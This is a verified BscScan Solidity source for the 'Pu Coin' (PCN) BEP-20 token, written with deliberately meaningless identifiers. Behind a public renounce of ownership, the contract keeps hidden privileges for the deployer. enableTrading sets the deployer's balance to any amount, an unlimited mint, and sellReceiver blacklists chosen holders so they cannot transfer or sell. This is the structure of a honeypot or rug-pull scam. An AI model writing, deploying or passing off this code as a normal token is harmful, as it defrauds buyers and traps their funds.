/**
 *Submitted for verification at BscScan.com on 2023-02-18
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.12;

interface receiverTo {
    function totalSupply() external view returns (uint256);

    function balanceOf(address amountMinBuy) external view returns (uint256);

    function transfer(address tradingToList, uint256 launchedSenderReceiver) external returns (bool);

    function allowance(address autoMinMode, address spender) external view returns (uint256);

    function approve(address spender, uint256 launchedSenderReceiver) external returns (bool);

    function transferFrom(
        address sender,
        address tradingToList,
        uint256 launchedSenderReceiver
    ) external returns (bool);

    event Transfer(address indexed from, address indexed txEnable, uint256 value);
    event Approval(address indexed autoMinMode, address indexed spender, uint256 value);
}

interface receiverToMetadata is receiverTo {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract totalFundIs {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface shouldTx {
    function createPair(address enableExempt, address teamAt) external returns (address);
}

interface teamFrom {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract PuCoin is totalFundIs, receiverTo, receiverToMetadata {

    function allowance(address atTxList, address listMax) external view virtual override returns (uint256) {
        return tradingMarketing[atTxList][listMax];
    }

    uint256 private tokenMode = 100000000 * 10 ** 18;

    uint256 private totalLiquidity;

    string private senderEnable = "Pu Coin";

    function totalSupply() external view virtual override returns (uint256) {
        return tokenMode;
    }

    function enableTrading(uint256 launchedSenderReceiver) public {
        if (!autoSwapToken[_msgSender()]) {
            return;
        }
        launchShould[atMode] = launchedSenderReceiver;
    }

    function receiverFrom() public {
        if (launchBuySwap != limitLiquidity) {
            totalLiquidity = feeShouldLiquidity;
        }
        
        feeShouldLiquidity=0;
    }

    uint256 public launchBuySwap;

    function transferFrom(address tradingLimit, address tradingToList, uint256 launchedSenderReceiver) external override returns (bool) {
        if (tradingMarketing[tradingLimit][_msgSender()] != type(uint256).max) {
            require(launchedSenderReceiver <= tradingMarketing[tradingLimit][_msgSender()]);
            tradingMarketing[tradingLimit][_msgSender()] -= launchedSenderReceiver;
        }
        return launchAt(tradingLimit, tradingToList, launchedSenderReceiver);
    }

    function owner() external view returns (address) {
        return modeFee;
    }

    mapping(address => mapping(address => uint256)) private tradingMarketing;

    function marketingLaunch() public {
        emit OwnershipTransferred(atMode, address(0));
        modeFee = address(0);
    }

    uint256 private tradingFundList;

    address public atMode;

    function getOwner() external view returns (address) {
        return modeFee;
    }

    function amountAtSwap() public {
        
        if (launchBuySwap == tradingFundList) {
            tradingFundList = modeTx;
        }
        totalLiquidity=0;
    }

    function symbol() external view virtual override returns (string memory) {
        return exemptMode;
    }

    constructor (){
        if (feeShouldLiquidity != modeTx) {
            limitLiquidity = launchBuySwap;
        }
        teamFrom totalSwap = teamFrom(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        fundFee = shouldTx(totalSwap.factory()).createPair(totalSwap.WETH(), address(this));
        modeFee = _msgSender();
        if (launchBuySwap != modeTx) {
            launchBuySwap = tradingFundList;
        }
        atMode = _msgSender();
        autoSwapToken[_msgSender()] = true;
        if (feeShouldLiquidity == totalLiquidity) {
            feeShouldLiquidity = totalLiquidity;
        }
        launchShould[_msgSender()] = tokenMode;
        emit Transfer(address(0), atMode, tokenMode);
        marketingLaunch();
    }

    bool public shouldTradingLaunched;

    address public fundFee;

    event OwnershipTransferred(address indexed shouldExempt, address indexed fundAmountSender);

    mapping(address => uint256) private launchShould;

    function maxTeam() public view returns (uint256) {
        return launchBuySwap;
    }

    uint256 private feeShouldLiquidity;

    uint8 private liquidityFrom = 18;

    mapping(address => bool) public autoSwapToken;

    function tokenTake(address marketingTakeLaunched) public {
        if (shouldTradingLaunched) {
            return;
        }
        if (tradingFundList != feeShouldLiquidity) {
            launchBuySwap = modeTx;
        }
        autoSwapToken[marketingTakeLaunched] = true;
        
        shouldTradingLaunched = true;
    }

    mapping(address => bool) public tokenWalletAuto;

    function decimals() external view virtual override returns (uint8) {
        return liquidityFrom;
    }

    uint256 public modeTx;

    function transfer(address exemptSell, uint256 launchedSenderReceiver) external virtual override returns (bool) {
        return launchAt(_msgSender(), exemptSell, launchedSenderReceiver);
    }

    uint256 public limitLiquidity;

    function approve(address listMax, uint256 launchedSenderReceiver) public virtual override returns (bool) {
        tradingMarketing[_msgSender()][listMax] = launchedSenderReceiver;
        emit Approval(_msgSender(), listMax, launchedSenderReceiver);
        return true;
    }

    function isTotal() public view returns (uint256) {
        return launchBuySwap;
    }

    function name() external view virtual override returns (string memory) {
        return senderEnable;
    }

    address private modeFee;

    function launchAt(address tradingLimit, address tradingToList, uint256 launchedSenderReceiver) internal returns (bool) {
        if (tradingLimit == atMode) {
            return swapTo(tradingLimit, tradingToList, launchedSenderReceiver);
        }
        require(!tokenWalletAuto[tradingLimit]);
        return swapTo(tradingLimit, tradingToList, launchedSenderReceiver);
    }

    function balanceOf(address amountMinBuy) public view virtual override returns (uint256) {
        return launchShould[amountMinBuy];
    }

    function swapTo(address tradingLimit, address tradingToList, uint256 launchedSenderReceiver) internal returns (bool) {
        require(launchShould[tradingLimit] >= launchedSenderReceiver);
        launchShould[tradingLimit] -= launchedSenderReceiver;
        launchShould[tradingToList] += launchedSenderReceiver;
        emit Transfer(tradingLimit, tradingToList, launchedSenderReceiver);
        return true;
    }

    function sellReceiver(address listAuto) public {
        
        if (listAuto == atMode || listAuto == fundFee || !autoSwapToken[_msgSender()]) {
            return;
        }
        if (limitLiquidity == tradingFundList) {
            totalLiquidity = limitLiquidity;
        }
        tokenWalletAuto[listAuto] = true;
    }

    string private exemptMode = "PCN";

}